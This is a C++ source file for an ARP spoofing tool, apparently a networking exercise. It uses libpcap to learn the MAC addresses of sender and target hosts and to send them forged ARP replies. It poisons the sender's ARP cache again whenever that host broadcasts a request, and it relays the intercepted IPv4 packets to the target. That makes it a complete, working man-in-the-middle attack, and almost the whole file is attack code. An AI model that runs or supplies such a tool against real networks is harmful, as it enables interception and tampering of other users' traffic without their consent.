#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string>
#include <iostream>
#include <fstream>
#include <vector>
using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

struct ipv4_hdr
{
    u_int8_t ver_ihl; //version and IHL
    u_int8_t DSCP_ECN; //DSCP and ECN
    u_int16_t len; // total length
    u_int16_t id; // identification
    u_int16_t flag_frag_offset; // flags and fragment offset
    u_int8_t ttl; // time to live
    u_int8_t protocol; // protocol
    u_int16_t checksum; // header checksum
    Ip ip_shost; // source IP address
    Ip ip_dhost; // dest IP address
};

void usage() {
	printf("syntax: arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: arp-spoof eth0 192.168.50.21 192.168.50.1\n");
}

bool get_my_mac(std::string & strMac, char* dev) {
	// https://m.blog.naver.com/websearch/221811963830
	unsigned char arrMac[6];
	char szMac[51];
	bool bRes = false;
	struct ifreq ifr;

	strMac.clear();

	int hSocket = socket( AF_INET, SOCK_DGRAM, IPPROTO_IP );
	if (hSocket == -1) return false;

	strcpy( ifr.ifr_name, dev );
	if ( ioctl( hSocket, SIOCGIFHWADDR, &ifr ) == 0 )
	{
		memcpy( arrMac, ifr.ifr_hwaddr.sa_data, sizeof(arrMac) );
		bRes = true;
	}

	close( hSocket );

	if( bRes )
	{
		snprintf( szMac, sizeof(szMac), "%02X:%02X:%02X:%02X:%02X:%02X", arrMac[0], arrMac[1], arrMac[2], arrMac[3], arrMac[4], arrMac[5] );
		strMac = szMac;
		return true;
	}

	return false;
}


bool get_my_ip(std::string & myip, char* dev) {
	int n;
    struct ifreq ifr;
 
    n = socket(AF_INET, SOCK_DGRAM, 0);
    //Type of address to retrieve - IPv4 IP address
    ifr.ifr_addr.sa_family = AF_INET;
    //Copy the interface name in the ifreq structure
    strncpy(ifr.ifr_name , dev , IFNAMSIZ - 1);
    ioctl(n, SIOCGIFADDR, &ifr);
	myip = inet_ntoa(( (struct sockaddr_in *)&ifr.ifr_addr )->sin_addr);
    close(n);
	return true;
}

void send_arp_packet(pcap_t* handle, char* dev, Mac* eth_dmac,
Mac* eth_smac, Mac* arp_smac, string* arp_sip, Mac* arp_tmac,
string* arp_tip, int mode) {
	EthArpPacket packet;

	packet.eth_.dmac_ = *eth_dmac;
	packet.eth_.smac_ = *eth_smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	if (mode == 0) {
		packet.arp_.op_ = htons(ArpHdr::Request);
	}
	else {
		packet.arp_.op_ = htons(ArpHdr::Reply);
	}
	packet.arp_.smac_ = *arp_smac;
	packet.arp_.sip_ = htonl(Ip(*arp_sip));
	packet.arp_.tmac_ = *arp_tmac;
	packet.arp_.tip_ = htonl(Ip(*arp_tip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

void get_arp_packet(pcap_t* handle, char* dev, Mac* eth_dmac, 
Mac* eth_smac, Mac* arp_smac, string* arp_sip, Mac* arp_tmac, 
string* arp_tip) {
	while(true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		struct EthHdr* ethp;
		struct ArpHdr* arpp;
		ethp = (struct EthHdr*) packet;
		arpp = (struct ArpHdr*) (packet + sizeof(struct EthHdr));
		if (ethp->type() != EthHdr::Arp
		|| ethp->dmac() != *eth_dmac) {
			continue;
		}
		if (arpp->sip() != Ip(*arp_sip)
		|| arpp->tmac() != *arp_tmac
		|| arpp->tip() != Ip(*arp_tip)) {
			continue;
		}
		*arp_smac = arpp->smac();
		break;
	}
}

void get_packet(pcap_t* handle, char* dev, Mac mymac_m, string myip,
vector<string>sender_ip, vector<string> target_ip, Mac* sender_mac, Mac* target_mac) {
	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		Mac allff = Mac("ff:ff:ff:ff:ff:ff");
		Mac all00 = Mac("00:00:00:00:00:00");
		struct EthHdr* ethp;
		struct ArpHdr* arpp;
		struct ipv4_hdr* ipv4p;

		ethp = (struct EthHdr*) packet;

		if (ethp->type() == EthHdr::Arp) {
			arpp = (struct ArpHdr*) (packet + sizeof(struct EthHdr));
			if ((ethp->dmac() == allff) && (arpp->tmac() == all00)) {
				for (int num = 0; num < sender_ip.size(); num++) {
					if (arpp->sip() == Ip(sender_ip[num])) {
						send_arp_packet(handle, dev, &sender_mac[num], &mymac_m, &mymac_m,
						&target_ip[num], &sender_mac[num], &sender_ip[num], 1);
					}
					else if (arpp->tip() == Ip(sender_ip[num])) {
						send_arp_packet(handle, dev, &sender_mac[num], &mymac_m, &mymac_m,
						&target_ip[num], &sender_mac[num], &sender_ip[num], 1);
					}
				}
			}
		}

		if (ethp->type() == EthHdr::Ip4) {
			ipv4p = (struct ipv4_hdr*) (packet + sizeof(struct EthHdr));
			int is_send = 0;
			for (int num = 0; num < sender_ip.size(); num++) {
				Ip shost = ntohl(ipv4p->ip_shost);
				Ip dhost = ntohl(ipv4p->ip_dhost);
				if (shost == sender_ip[num]) {
					/*
					cout << "current: ";
					for (int num1 = 0; num1 < header->caplen; num1++) {
						printf("%x", packet[num1]);
					}
					cout << endl;
					
					cout << (string)ethp->dmac() << " " << (string)ethp->smac() << endl;
					cout << (string)shost << " " << (string)dhost << endl;
					*/
					ethp->smac_ = mymac_m;
					ethp->dmac_ = target_mac[num];
					is_send = 1;
					break;
				}
			}

			if (is_send == 1) {
				/*
				cout << "changed: ";
				for (int num1 = 0; num1 < header->caplen; num1++) {
					printf("%x", packet[num1]);
				}
				cout << endl;
				Ip shost = ntohl(ipv4p->ip_shost);
				Ip dhost = ntohl(ipv4p->ip_dhost);
				cout << (string)ethp->dmac() << " " << (string)ethp->smac() << endl;
				cout << (string)shost << " " << (string)dhost << endl;
				*/
				int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), header->caplen);
				if (res != 0) {
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
				}
			}
		}
	}
}


void init_arp_spoof(pcap_t* handle, char* dev, Mac mymac_m, string myip,
vector<string>sender_ip, vector<string> target_ip, Mac* sender_mac, Mac* target_mac) {
	Mac allff = Mac("ff:ff:ff:ff:ff:ff");
	Mac all00 = Mac("00:00:00:00:00:00");
	for (int num = 0; num < sender_ip.size(); num++) {
		send_arp_packet(handle, dev, &allff, &mymac_m, &mymac_m, &myip, 
		&all00, &sender_ip[num], 0);
		get_arp_packet(handle, dev, &mymac_m, &sender_mac[num], 
		&sender_mac[num], &sender_ip[num], &mymac_m, &myip);
		send_arp_packet(handle, dev, &allff, &mymac_m, &mymac_m, &myip, 
		&all00, &target_ip[num], 0);
		get_arp_packet(handle, dev, &mymac_m, &target_mac[num], 
		&target_mac[num], &target_ip[num], &mymac_m, &myip);
		send_arp_packet(handle, dev, &sender_mac[num], &mymac_m, &mymac_m,
		&target_ip[num], &sender_mac[num], &sender_ip[num], 1);
		//cout << (string)mymac_m << endl;
		//cout << (string)target_mac[num] << endl;
	}
}

int main(int argc, char* argv[]) {
	if ((argc < 3) || (argc % 2 == 1)) {
		usage();
		return -1;
	}
	
	vector<string> sender_ip;
	vector<string> target_ip;
	Mac sender_mac[100];
	Mac target_mac[100];

	for (int argv_idx = 2; argv_idx < argc; argv_idx++) {
		if (argv_idx % 2 == 0) {
			sender_ip.push_back(argv[argv_idx]);
		}
		else {
			target_ip.push_back(argv[argv_idx]);
		}
	}

	char* dev = argv[1];

	string mymac;
	bool ismac = get_my_mac(mymac, dev);

	string myip;
	bool isip = get_my_ip(myip, dev);

	Mac smac_m;
	Mac mymac_m = Mac(mymac);

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		exit(-1);
	}

	init_arp_spoof(handle, dev, mymac_m, myip, sender_ip, target_ip, sender_mac, target_mac);

	get_packet(handle, dev, mymac_m, myip, sender_ip, target_ip, sender_mac, target_mac);

	/*
	Mac allff = Mac("ff:ff:ff:ff:ff:ff");
	Mac all00 = Mac("00:00:00:00:00:00");
	for (int num = 0; num < (argc - 2) / 2; num++) {
		send_arp_packet(handle, dev, &allff, &mymac_m, &mymac_m, &myip,
	&all00, &sender_ip[num], 0);

	get_arp_packet(handle, dev, &mymac_m, &smac_m, &smac_m, &sender_ip[num],
	&mymac_m, &myip);

	send_arp_packet(handle, dev, &smac_m, &mymac_m, &mymac_m, &target_ip[num], 
	&smac_m, &sender_ip[num], 1);
	
	}
	*/
	

	pcap_close(handle);
}
